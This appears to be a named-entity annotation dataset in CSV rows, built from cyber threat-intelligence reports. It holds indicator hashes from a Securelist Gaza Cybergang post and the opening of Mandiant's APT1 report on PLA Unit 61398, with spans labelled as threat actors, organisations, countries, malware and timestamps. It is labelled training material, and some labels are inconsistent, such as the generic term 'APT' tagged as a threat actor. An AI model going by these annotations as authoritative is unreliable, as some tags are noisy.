Gaza Cybergang - updated activity in 2017_ - Securelist,7b536c348a21c309605fa2cd2860a41d,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,cf9d89061917e9f48481db80e674f0e9,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,6d6f34f7cfcb64e44d67638a2f33d619,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,86a89693a273d6962825cf1846c3b6ce,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,5472d0554a0188c0ecebd065eddb9485,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

SHA256

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,0b6fe466a3ba36895208e754b155a193780c79ba8b5c1c9f02c4f7e479116e5f,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,0c4aa50c95c990d5c5c55345626155b87625986881a2c066ce032af6871c426a,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,0d235478ae9cc87b7b907181ccd151b618d74955716ba2dbc40a74dc1cdfc4aa,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,1f2b128d26a58a572ea1faee2c4d9dc759eb8add16d9ad0547b3f0305fea212a,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,205f32cc717c2d82baeff9ff5aa9fc31967b6ae5cde22fafe14aec9c9ec62acc,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,284af7a2fafdbff3bbc28b9075f469d2352758b62d182b0e056d29ee74688126,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,344dc6ece5a6dacce9050a65305d4b34865756051a6f414477b6fa381e1c1b63,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,42e4298f5162aba825309673187e27121e3f918238e81f3a6e021c03f3455154,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,44a8d0561a9cc6e24d6935ff4c35b7b7db50c4001eb01c48ea1cfd13253bc694,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,57a12f20c6bbd69b93e76d6d5a31d720046b498aa880b95b85a4f3fda28aac4f,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,72b039550d31afaeee11dedf7d80333aeda5c504272d426ae0d91bc0cd82c5b0,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,72d2ad8f38e60c23c96698149507fc627664a5706a4431b96014fbf25495b529,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,788f7fd06030f87d411c61efbc52a3efca03359570353da209b2ce4ccf5b4b70,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7fcac2f18a8844e4af9f923891cfb6f637a99195a457b6cdb916926d709c6a04,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,84adba3c81ad1c2a8285c31d1171f6f671492d9f3ed5ee2c7af326a9a8dc5278,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,852ccc491204f227c3da58a00f53846296454d124b23021bdb168798c8eee2fb,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,86bd78b4c8c94c046d927fb29ae0b944bf2a8513a378b51b3977b77e59a52806,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,9347a47d63b29c96a4f39b201537d844e249ac50ded388d66f47adc4e0880c7e,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,b597d7b5b9c2f1962257f912e911961ad0da4c28fc6a90a0b7db4e242aa007d8,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,bfb88878a22c23138a67cc25872e82d77e54036b846067ddc43e988c50379915,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,c23f715c8588c8d8725352ed515749389d898996107132b2d25749a4efc82a90,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,c47bc2c15f08655d158bb8c9d5254c804c9b6faded526be6879fa94ea4a64f72,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,db53b35c80e8ec3f8782c4d34c83389e8e9b837a6b3cc700c1b566e4e4450ec2,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,dd9debe517717552d7422b08a477faa01badbcc4074830c080a1a1c763e1a544,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,b800d29d6e1f2f85c5bc036e927c1dae745a3c646389599b0754592d76b5564b,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,APT,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist,"  ARABIC MALWARE  MACROS  MOBILE MALWARE

TARGETED ATTACKS  VULNERABILITIES AND EXPLOITS

Related Posts

    

Analyzing an
exploit for
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,СVE-2017-11826,O
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Bad Rabbit,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"
ransomware

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,BlackOasis APT,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist,"
and new
targeted
attacks
leveraging
zero-day
exploit

https://securelist.com/all?tag=538
https://securelist.com/all?tag=660
https://securelist.com/all?tag=542
https://securelist.com/all?tag=76
https://securelist.com/all?tag=53
https://securelist.com/all?tag=41
https://securelist.com/analyzing-an-exploit-for-%d1%81ve-2017-11826/82869/
https://securelist.com/bad-rabbit-ransomware/82851/
https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"
Exposing One of ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s Cyber 
Espionage Units



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"  www.mandiant.com

Contents

Executive Summary .......................................................................................................... 2

",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,’s Computer Network Operations Tasking to ,O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report," (61398部队) .................... 7

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Years of Espionage  ............................................................................................... 20

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Attack Lifecycle .................................................................................................... 27

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Infrastructure ....................................................................................................... 39

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Identities ............................................................................................................. 51

Conclusion ..................................................................................................................... 59

Appendix A: How Does ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," Distinguish Threat Groups? .............................................. 61

Appendix B: ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," and the Attack Lifecycle......................................................................... 63

Appendix C (Digital): The Malware Arsenal ........................................................................ 66

Appendix D (Digital): FQDNs ............................................................................................ 67

Appendix E (Digital): MD5 Hashes ................................................................................... 68

Appendix F (Digital): SSL Certificates ............................................................................... 69

Appendix G (Digital): IOCs ............................................................................................... 70

Appendix H (Digital): Video .............................................................................................. 74



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 1 www.mandiant.com

“",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,’s economic espionage has reached an intolerable level and I believe that the ,O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report, and our allies in ,O
Mandiant_APT1_Report,Europe,country
Mandiant_APT1_Report," and 
",O
Mandiant_APT1_Report,Asia,country
Mandiant_APT1_Report, have an obligation to confront ,O
Mandiant_APT1_Report,Beijing,city
Mandiant_APT1_Report," and demand that they 
put a stop to this piracy. 

",O
Mandiant_APT1_Report,Beijing,city
Mandiant_APT1_Report," is waging a massive trade war on us all, and we should 
band together to pressure them to stop. Combined, the ",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report, and our allies in ,O
Mandiant_APT1_Report,Europe,country
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Asia,country
Mandiant_APT1_Report," have significant 
diplomatic and economic leverage over ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,", and we should 
use this to our advantage to put an end to this scourge.”1

— ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, Rep. ,O
Mandiant_APT1_Report,Mike Rogers,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,"October, 2011",timestamp
Mandiant_APT1_Report,"

“ It is unprofessional and groundless to accuse the ",O
Mandiant_APT1_Report,Chinese military,org
Mandiant_APT1_Report," of launching cyber attacks 
without any conclusive evidence.”2

— ",O
Mandiant_APT1_Report,Chinese Defense Ministry,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,"January, 2013",timestamp
Mandiant_APT1_Report,"

1 “",O
Mandiant_APT1_Report,Mike Rogers,identity
Mandiant_APT1_Report,", Statement to the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," House, Permanent Select Committee on Intelligence, Open Hearing: Cyber Threats and Ongoing Efforts to 
Protect the Nation, Hearing, ",O
Mandiant_APT1_Report,"October 4, 2011",timestamp
Mandiant_APT1_Report,", http://intelligence.house.gov/sites/intelligence.house.gov/files/documents/100411CyberHearingRogers.
pdf, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
2 “Chinese hackers suspected in attack on The Post’s computers.” The ",O
Mandiant_APT1_Report,Washington Post,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,"Feb. 1, 2013",timestamp
Mandiant_APT1_Report,", http://www.washingtonpost.com/business/
technology/chinese-hackers-suspected-in-attack-on-the-posts-computers/2013/02/01/d5a44fde-6cb1-11e2-bd36-c0fe61a205f6_story.html, 
accessed ",O
Mandiant_APT1_Report,"Feb. 1, 2013",timestamp
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 2 www.mandiant.com

exeCutIve suMMary

",O
Mandiant_APT1_Report,Since 2004,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," has investigated computer security breaches at hundreds of organizations around the world. 
The majority of these security breaches are attributed to advanced threat actors referred to as the “Advanced Persistent 
Threat” (",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report,). We first published details about the ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, in our ,O
Mandiant_APT1_Report,January 2010,timestamp
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,M-Trends,org
Mandiant_APT1_Report," report. As we stated in the 
report, our position was that “The ",O
Mandiant_APT1_Report,Chinese government,org
Mandiant_APT1_Report," may authorize this activity, but there’s no way to determine the 
extent of its involvement.” Now, three years later, we have the evidence required to change our assessment. The details 
we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based 
primarily in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, and that the ,O
Mandiant_APT1_Report,Chinese Government,org
Mandiant_APT1_Report," is aware of them.3 

",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, continues to track dozens of ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups around the world; however, this report is focused on the most 
prolific of these groups. We refer to this group as “",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,” and it is one of more than 20 ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups with origins in 
",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,. ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is a single organization of operators that has conducted a cyber espionage campaign against a broad 
range of victims ",O
Mandiant_APT1_Report,since at least 2006,timestamp
Mandiant_APT1_Report,". From our observations, it is one of the most prolific cyber espionage groups in 
terms of the sheer quantity of information stolen. The scale and impact of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s operations compelled us to write this 
report.

The activity we have directly observed likely represents only a small fraction of the cyber espionage that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has 
conducted. Though our visibility of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s activities is incomplete, we have analyzed the group’s intrusions against 
nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," back 
to four large networks in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", two of which are allocated directly to the Pudong New Area. We uncovered a 
substantial amount of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s attack infrastructure, command and control, and modus operandi (tools, tactics, and 
procedures). In an effort to underscore there are actual individuals behind the keyboard, ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," is revealing three 
personas we have attributed to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". These operators, like soldiers, may merely be following orders given to them by 
others.

Our analysis has led us to conclude that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, is likely government-sponsored and one of the most persistent of ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s 
cyber threat actors. We believe that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is able to wage such a long-running and extensive cyber espionage campaign 
in large part because it receives direct government support. In seeking to identify the organization behind this activity, 
our research found that ",O
Mandiant_APT1_Report,People’s Liberation Army,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,’s) ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, is similar to ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," in its mission, capabilities, and 
resources. ",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report, is also located in precisely the same area from which ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity appears to originate.

3 Our conclusions are based exclusively on unclassified, open source information derived from ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," observations. None of the information in 
this report involves access to or confirmation by classified intelligence.

https://www.mandiant.com/resources/m-trends/


",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 3 www.mandiant.com

KEY FINDINGS

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, is believed to be the 2nd Bureau of the ,O
Mandiant_APT1_Report,People’s Liberation army,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,) ,O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report,"’s 
(",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report,") 3rd Department (总参三部二局), which is most commonly known by its ",O
Mandiant_APT1_Report,Military unit Cover Designator,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,MUCD,org
Mandiant_APT1_Report,) as ,O
Mandiant_APT1_Report,unit 61398,threat_actor
Mandiant_APT1_Report," (61398部队).
»» The nature of “",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,’s” work is considered by ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," to be a state secret; however, we believe it engages in 

harmful “Computer Network Operations.” 

»» ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, is partially situated on Datong Road (大同路) in ,O
Mandiant_APT1_Report,Gaoqiaozhen,city
Mandiant_APT1_Report," (高桥镇), which is located in the Pudong 
New Area (浦东新区) of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," (上海). The central building in this compound is a 130,663 square foot facility 
that is 12 stories high and was built ",O
Mandiant_APT1_Report,in early 2007,timestamp
Mandiant_APT1_Report,".

»» We estimate that ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," is staffed by hundreds, and perhaps thousands of people based on the size of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s physical infrastructure. 

»» ",O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report," provided special fiber optic communications infrastructure for the unit in the name of national 
defense.

»» ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," requires its personnel to be trained in computer security and computer network operations and also 
requires its personnel to be proficient in the English language. 

»» ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, has traced ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,’s activity to four large networks in ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", two of which serve the Pudong New Area 
where ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," is based.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has 
demonstrated the capability and intent to steal from dozens of organizations simultaneously.4

»» ",O
Mandiant_APT1_Report,Since 2006,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, has observed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," compromise 141 companies spanning 20 major industries.

»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has a well-defined attack methodology, honed over years and designed to steal large volumes of valuable 
intellectual property.

»» Once ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has established access, they periodically revisit the victim’s network over several months or years 
and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing 
processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists 
from victim organizations’ leadership. 

»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," uses some tools and techniques that we have not yet observed being used by other groups including two 
utilities designed to steal email — ",O
Mandiant_APT1_Report,GETMAIL,malware
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,MAPIGET,malware
Mandiant_APT1_Report,".

»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, maintained access to victim networks for an average of 356 days.5 The longest time period ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," maintained 
access to a victim’s network was 1,764 days, or four years and ten months.

»» Among other large-scale thefts of intellectual property, we have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," stealing 6.5 terabytes of 
compressed data from a single organization over a ten-month time period. 

»» ",O
Mandiant_APT1_Report,In the first month of 2011,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," successfully compromised at least 17 new victims operating in 10 different 
industries.

4  We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has conducted. 
Therefore, ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, is establishing the lower bounds of ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activities in this report.
5  This is based on 91 of the 141 victim organizations. In the remaining cases, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity is either ongoing or else we do not have visibility into 
the last known date of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity in the network.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 4 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," focuses on compromising organizations across a broad range of industries in english-speaking 
countries. 
»» Of the 141 ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," victims, 87% of them are headquartered in countries where English is the native language. 

»» The industries ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, targets match industries that ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," has identified as strategic to their growth, including four of 
the seven strategic emerging industries that ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," identified in its 12th Five Year Plan. 

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," maintains an extensive infrastructure of computer systems around the world.
»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," controls thousands of systems in support of their computer intrusion activities. 

»» In the last two years we have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," establish a minimum of 937 Command and Control (C2) servers 
hosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were 
registered to organizations in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," (709), followed by the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," (109). 

»» In the last three years we have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," use fully qualified domain names (FQDNs) resolving to 988 unique 
IP addresses.

»» ",O
Mandiant_APT1_Report,Over a two-year period,timestamp
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,January 2011 to January 2013,timestamp
Mandiant_APT1_Report,") we confirmed 1,905 instances of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actors logging into 
their attack infrastructure from 832 different IP addresses with ",O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report,", a tool that provides a remote user 
with an interactive graphical interface to a system.

»» In the last several years we have confirmed 2,551 FQDNs attributed to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". 

In over 97% of the 1,905 times ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, observed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders connecting to their attack 
infrastructure, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, used IP addresses registered in ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," and systems set to use the simplified 
Chinese language.
»» In 1,849 of the 1,905 (97%) of the ",O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report, sessions ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," conducted under our observation, the ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 

operator’s keyboard layout setting was “Chinese (Simplified) — US Keyboard”. ",O
Mandiant_APT1_Report,Microsoft’s Remote Desktop,software
Mandiant_APT1_Report," client 
configures this setting automatically based on the selected language on the client system. Therefore, the ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
attackers likely have their ",O
Mandiant_APT1_Report,Microsoft,org
Mandiant_APT1_Report,"® operating system configured to display Simplified Chinese fonts.

»» 817 of the 832 (98%) IP addresses logging into ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, controlled systems using ,O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report," resolved back to 
",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,".

»» We observed 767 separate instances in which ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders used the “,O
Mandiant_APT1_Report,HUC Packet Transmit Tool,tool
Mandiant_APT1_Report,” or ,O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," 
to communicate between 614 distinct routable IP addresses and their victims’ systems using their attack 
infrastructure. Of the 614 distinct IP addresses used for ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," communications: 

»− 614 of 614 (100%) were registered in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,".

»− 613 (99.8%) were registered to one of four ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," net blocks. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 5 www.mandiant.com

the size of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s infrastructure implies a large organization with at least dozens, but potentially 
hundreds of human operators. 
»» We conservatively estimate that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s current attack infrastructure includes over 1,000 servers.

»» Given the volume, duration and type of attack activity we have observed, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," operators would need to be directly 
supported by linguists, open source researchers, malware authors, industry experts who translate task requests 
from requestors to the operators, and people who then transmit stolen information to the requestors. 

»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who 
handle ",O
Mandiant_APT1_Report,finances,industry
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,facility management,industry
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,logistics,industry
Mandiant_APT1_Report," (e.g., ",O
Mandiant_APT1_Report,shipping,industry
Mandiant_APT1_Report,").

In an effort to underscore that there are actual individuals behind the keyboard, ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," is revealing 
three personas that are associated with ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity. 
»» The first persona, “",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,"”, has been active in computer network operations since ",O
Mandiant_APT1_Report,October 2004,timestamp
Mandiant_APT1_Report,". His activities 

include registering domains attributed to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, and authoring malware used in ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, campaigns. “,O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,"” 
publicly expressed his interest in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,’s “cyber troops” in ,O
Mandiant_APT1_Report,January 2004,timestamp
Mandiant_APT1_Report,".

»» The second persona, an actor we call “",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,"”, has registered dozens of email accounts used to conduct ",O
Mandiant_APT1_Report,social engineering,technique
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,spear phishing,technique
Mandiant_APT1_Report, attacks in support of ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, campaigns. “,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,” used a ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," phone number 
while registering these accounts.

»» We have observed both the “",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,” persona and the “,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,"” persona using the same shared infrastructure, 
including FQDNs and IP ranges that we have attributed to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". 

»» The third persona, who uses the nickname “",O
Mandiant_APT1_Report,SUPERHARD,identity
Mandiant_APT1_Report,",” is the creator or a significant contributor to the ",O
Mandiant_APT1_Report,AURIGA,malware
Mandiant_APT1_Report," 
and ",O
Mandiant_APT1_Report,BANGAT,malware
Mandiant_APT1_Report, malware families which we have observed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, and other ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, groups use. “,O
Mandiant_APT1_Report,SUPERHARD,identity
Mandiant_APT1_Report,"” discloses 
his location to be the Pudong New Area of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,".

",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," is releasing more than 3,000 indicators to bolster defenses against ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," operations. 
»» Specifically, ",O
Mandiant_APT1_Report,Mandiant,org
